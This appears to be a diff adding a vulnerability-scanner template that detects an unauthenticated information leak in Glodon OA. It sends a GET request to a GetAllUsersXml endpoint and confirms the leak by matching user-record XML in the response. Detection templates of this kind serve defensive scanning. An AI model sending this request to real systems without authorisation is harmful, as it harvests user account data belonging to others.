@@ -1,0 +1,25 @@
+id: glodon-getallusersxml-info-leak
+info:
+  name: Glodon OA GetAllUsersXml Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "/Org/service/Service.asmx/GetAllUsersXml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "><User UserId"
+          - "Code="
+          - "Name="
+        part: body
+      - type: word
+        part: header
+        words:
+          - "text/xml"
